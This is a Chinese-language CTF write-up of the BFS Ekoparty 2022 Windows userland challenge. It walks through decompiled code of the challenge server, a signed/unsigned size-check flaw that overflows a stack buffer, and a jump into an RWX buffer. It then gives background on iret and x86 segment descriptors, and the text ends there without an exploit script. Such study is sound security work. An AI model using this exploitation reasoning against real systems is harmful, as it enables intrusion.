<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>BFS-Ekoparty2022-windows-pwn - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
Windows userland PWN
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="BFS-Ekoparty2022-windows-pwn" />
<meta property="og:description" content="
Windows userland PWN
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/bfs-ekoparty2022-windows-pwn/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-08-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-08-04T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BFS-Ekoparty2022-windows-pwn"/>
<meta name="twitter:description" content="
Windows userland PWN
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">BFS-Ekoparty2022-windows-pwn</h1>
			<div class="meta">Posted on Aug 4, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>Windows userland PWN</p>
</blockquote>
<p>在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下</p>
<p>网址：<a href="https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/">BFS Ekoparty 2022 Exploitation Challenges</a>真好，还能直接发offer😭</p>
<h2 id="eko">eko</h2>
<p>弹出计算机就算成功，不能使用额外的库。</p>
<ul>
<li>在本机win11 24h2进行调试</li>
</ul>
<p>winchecksec</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">bfs-eko2022</span> ❯ winchecksec .\<span style="color:#8be9fd;font-style:italic">bfs-eko2022</span>.exe
</span></span><span style="display:flex;"><span>Warn: No load config <span style="color:#ff79c6">in</span> the PE
</span></span><span style="display:flex;"><span>Results <span style="color:#ff79c6">for</span>: .\<span style="color:#8be9fd;font-style:italic">bfs-eko2022</span>.exe
</span></span><span style="display:flex;"><span>Dynamic Base    : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>ASLR            : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>High Entropy VA : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Force Integrity : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Isolation       : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>NX              : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>SEH             : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>CFG             : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>RFG             : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>SafeSEH         : <span style="color:#f1fa8c">&#34;NotApplicable&#34;</span>
</span></span><span style="display:flex;"><span>GS              : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Authenticode    : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>.NET            : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span></code></pre></div><p>x64dbg 插件：<a href="https://github.com/klks/checksec">checksec: x64dbg plugin to check security settings</a>，可以看相关dll的保护。</p>
<p>没有GS保护？但是使用IDA打开</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">0000000140001474</span>                 mov     rcx, [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0F</span><span style="color:#bd93f9">68</span>h<span style="color:#ff79c6">+</span>var_18]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">000000014000147</span>C                 xor     rcx, rsp        ; StackCookie
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">000000014000147F</span>                 call    __security_check_cookie
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">00000001400014</span><span style="color:#bd93f9">84</span>                 add     rsp, <span style="color:#bd93f9">0F</span><span style="color:#bd93f9">68</span>h
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">00000001400014</span><span style="color:#bd93f9">8</span>B                 retn
</span></span></code></pre></div><p>创建一个socket，接收消息: <code>0.0.0.0:31415</code></p>
<p>接收0x1000长度的消息，接收握手消息<code>Hello</code>，发送 <code>Hi</code></p>
<p>然后进入一个处理函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_140001240</span>(SOCKET a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> result; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v2; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-F48h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> len; <span style="color:#6272a4">// [rsp+24h] [rbp-F44h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> lena; <span style="color:#6272a4">// [rsp+24h] [rbp-F44h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  CHAR CmdLine[<span style="color:#bd93f9">3840</span>]; <span style="color:#6272a4">// [rsp+30h] [rbp-F38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v7; <span style="color:#6272a4">// [rsp+F30h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">11</span>]; <span style="color:#6272a4">// [rsp+F40h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x1000</span>; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">16</span> )            <span style="color:#6272a4">// 初始化buf
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;::</span>buf[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x5050505050505050</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;::</span>buf[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xCF58585858585858u</span>i64;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34; [+] Processing request</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  len <span style="color:#ff79c6">=</span> recv(a1, buf, <span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0</span>);                   <span style="color:#6272a4">// 接收cookie
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> ( len <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Client data error</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( len <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xBu</span>i64 )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Bad size</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)buf <span style="color:#ff79c6">!=</span> &#39;<span style="color:#bd93f9">2202</span>okE&#39; )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Wrong cookie value</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( buf[<span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;T&#39;</span> )                          <span style="color:#6272a4">// type
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Invalid packet type</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">__int16</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">9</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF00</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Invalid packet size</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  lena <span style="color:#ff79c6">=</span> recv(a1, <span style="color:#ff79c6">::</span>buf, <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">9</span>], <span style="color:#bd93f9">0</span>);<span style="color:#6272a4">// int16 -&gt; uint16 小变大
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  printf(<span style="color:#f1fa8c">&#34; [+] Data received: %i bytes</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, lena);
</span></span><span style="display:flex;"><span>  sub_1400011B0(CmdLine, <span style="color:#ff79c6">::</span>buf, lena);          <span style="color:#6272a4">// 内存copy
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;T&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;  [+] Message received: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, CmdLine);
</span></span><span style="display:flex;"><span>    send(a1, CmdLine, lena, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;  [-] Unsupported message</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#ff79c6">=</span> strlen(Str);
</span></span><span style="display:flex;"><span>    send(a1, aUnsupportedMes_1, v2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> v7;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;X&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    off_14000C000 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD))<span style="color:#ff79c6">&amp;::</span>buf[lena];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> off_14000C000(CmdLine);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>内存copy函数，某些字符在copy时会被替换为0。（看到后面发现这是一个提示？</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_7FF736B511B0</span>(_BYTE <span style="color:#ff79c6">*</span>a1, _BYTE <span style="color:#ff79c6">*</span>a2, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+0h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; ; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> a3;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">&gt;=</span> a3 )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>a2 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x2B</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">*</span>a2 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x33</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>a1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>a1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>a2;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">++</span>a2;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">++</span>a1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>int16 -&gt; unsigned int16 可以是负数转化后变为一个很大的数字，这样可以读的缓冲区就很大了。</p>
<p>可以修改 v7 为 <code>X</code>，但是不能太长，因为存在GS保护。</p>
<p>最后执行这个函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;X&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    off_14000C000 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD))<span style="color:#ff79c6">&amp;::</span>buf[lena];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">off_14000C000</span>(CmdLine);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>这个一个virtualAlloc的区域</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)VirtualAlloc((LPVOID)<span style="color:#bd93f9">0x10000000</span>, <span style="color:#bd93f9">0x1000u</span>i64, <span style="color:#bd93f9">0x3000u</span>, <span style="color:#bd93f9">0x40u</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LPVOID <span style="color:#50fa7b">VirtualAlloc</span>(
</span></span><span style="display:flex;"><span>  [in, optional] LPVOID lpAddress,
</span></span><span style="display:flex;"><span>  [in]           SIZE_T dwSize,
</span></span><span style="display:flex;"><span>  [in]           DWORD  flAllocationType,
</span></span><span style="display:flex;"><span>  [in]           DWORD  flProtect
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>最后一个属性：0x40代表 <strong>PAGE_EXECUTE_READWRITE</strong> 表明这片区域可执行。因此最后是跳转到我们输入的shellcode执行。</p>
<p>初始化的时候，写了数据，反编译后</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000000</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000001</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000002</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000003</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000004</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000005</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000006</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000007</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span><span style="color:#bd93f9">8</span>                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span><span style="color:#bd93f9">9</span>                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>A                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>B                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>C                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>D                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>E                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000F</span>                 iret
</span></span></code></pre></div><p>无论如何最后还是得执行这一段代码中的某些部分</p>
<p>iret 的作用：IRET(interrupt return)中断返回，中断服务程序的最后一条指令。IRET指令将推入堆栈的段地址和偏移地址弹出，使程序返回到原来发生中断的地方。相当于<strong>POP <code>RIP|CS|RFLAGS|SP|SS</code></strong></p>
<p>这里主要是段寄存器的处理，因为与寻址有关。在 real mode 下 <code>cs:ip = cs &lt;&lt; 4 + ip</code></p>
<p>但是在保护模式下段寄存器依然是16位，但是意义大不一样。参考：<a href="https://utopianfuture.github.io/X86/Segment-data-structure.html">段式管理的数据结构</a></p>
<p>GDTR保存GDT的相关信息，也就是GDT表的起始地址和大小</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> limit;    <span style="color:#6272a4">// GDT 最大长度
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint64_t</span> base;     <span style="color:#6272a4">// GDT 基地址，在x86下是 uint32_t
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} GDTR;
</span></span></code></pre></div><p>GDT表中的内容：段描述符，记录段的信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> limit_low;         <span style="color:#6272a4">// 段限界 0-15 bits (Segment Limit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> base_low;          <span style="color:#6272a4">// 基地址 0-15 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  base_mid;          <span style="color:#6272a4">// 基地址 16-23 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">type</span> : <span style="color:#bd93f9">4</span>;          <span style="color:#6272a4">// 段类型 (Segment Type)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">s</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// 描述符类型 (Descriptor Type, 0=system, 1=code or data)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">dpl</span> : <span style="color:#bd93f9">2</span>;           <span style="color:#6272a4">// 描述符特权级别 (Descriptor Privilege Level)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">p</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// 段存在位 (Segment Present)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">limit_high</span> : <span style="color:#bd93f9">4</span>;    <span style="color:#6272a4">// 段限界 16-19 bits (Segment Limit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">avl</span> : <span style="color:#bd93f9">1</span>;           <span style="color:#6272a4">// 可用位 (Available for use by system software)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">l</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// 64-bit code segment (0 for non-64-bit code segments)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">db</span> : <span style="color:#bd93f9">1</span>;            <span style="color:#6272a4">// 默认操作大小 (Default Operation Size, 0=16-bit, 1=32-bit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">g</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// 粒度 (Granularity, 0=byte, 1=4KB)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  base_high;         <span style="color:#6272a4">// 基地址 24-31 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} SegmentDescriptor;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-------------------------------------------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>  Base <span style="color:#bd93f9">31</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">24</span>  <span style="color:#ff79c6">|</span> G <span style="color:#ff79c6">|</span> D<span style="color:#ff79c6">/</span>B <span style="color:#ff79c6">|</span> L <span style="color:#ff79c6">|</span> AVL <span style="color:#ff79c6">|</span> Limit <span style="color:#bd93f9">19</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span> <span style="color:#ff79c6">|</span> P <span style="color:#ff79c6">|</span> DPL <span style="color:#ff79c6">|</span> S  <span style="color:#ff79c6">|</span> Type <span style="color:#ff79c6">|</span> Base <span style="color:#bd93f9">23</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span> <span style="color:#ff79c6">|</span>  Base <span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span>  <span style="color:#ff79c6">|</span> Limit <span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span> <span style="color:#ff79c6">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-------------------------------------------------------------------------------------------------------------</span>
</span></span></code></pre></div><p>段寄存器保存16位宽的段选择符segment selector</p>
